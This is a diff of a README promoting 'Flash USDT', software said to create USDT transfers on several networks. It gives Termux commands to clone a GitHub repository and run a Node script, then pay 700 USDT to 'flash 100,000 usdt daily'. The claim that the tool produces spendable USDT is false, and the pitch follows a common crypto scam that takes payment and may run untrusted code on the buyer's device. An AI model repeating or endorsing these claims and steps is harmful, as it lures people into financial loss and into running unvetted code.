@@ -1,33 +1,39 @@
 Here is the Software that allows you to flash USDT crypto coins in any network such as trc20, erc20, bep20
-# FLASH-USDT-
-Flash USDT: Your Ultimate High-Volume Crypto Transfer Tool!  Easily send a minimum of 10k USDT using our Flash USDT Sender. With advanced fees for security: 11-17% to receive, 40% to convert to ERC20, and 27% to send out. It’s all you need to manage large-scale transactions with ease.
-Here is the complete set of commands to set up the FLASH-USDT project on Termux:
 
-1. Update Termux Packages
+# FLASH-USDT
+Flash USDT: Your Ultimate High-Volume Crypto Transfer Tool!  Easily send a minimum of 10k USDT using our Flash USDT Sender. With advanced fees for security: 11-17% to receive, 40% to convert to ERC20, and 27% to send out. It’s all you need to manage large-scale transactions with ease.
+
+# Here is the complete set of commands to set up the FLASH-USDT project on Termux:
+
+# 1. Update Termux Packages
 
 First, ensure all your packages are up to date:
 
 pkg update && pkg upgrade
 
-2. Install Required Tools (Node.js, Git)
+# 2. Install Required Tools (Node.js, Git)
 
 Install Node.js, npm (Node package manager), and Git in Termux:
 
-pkg install nodejs git
+pkg install nodejs git npm
 
-3. Clone the Repository
+# Once Node.js and npm are installed, navigate to your project directory and run:
+
+npm install chalk ora
+
+# 3. Clone the Repository
 
 Clone the FLASH-USDT repository :
 
-git clone https://github.com/Hackkmann/FLASH-USDT-.git
+https://github.com/Hackkmann/USD-FLASHER.git
 
-4. Navigate to the Project Directory
+# 4. Navigate to the Project Directory
 
 Change to the project directory:
 
-cd FLASH-USDT-
+cd USD-FLASHER
 
-5. Install Project Dependencies
+# 5. Install Project Dependencies
 
 Run the following command to install all necessary dependencies:
 
@@ -43,8 +49,4 @@ node flashusdt.mjs
 
 Final Result
 
-The tool will start, and you'll pay 700usdt and start using the tool
-
----
-
-These are the exact commands you need to install and run the FLASH-USDT project on Termux
+The tool will start, and you'll pay 700usdt and start using the tool to flash usdt 100,000 usdt daily 
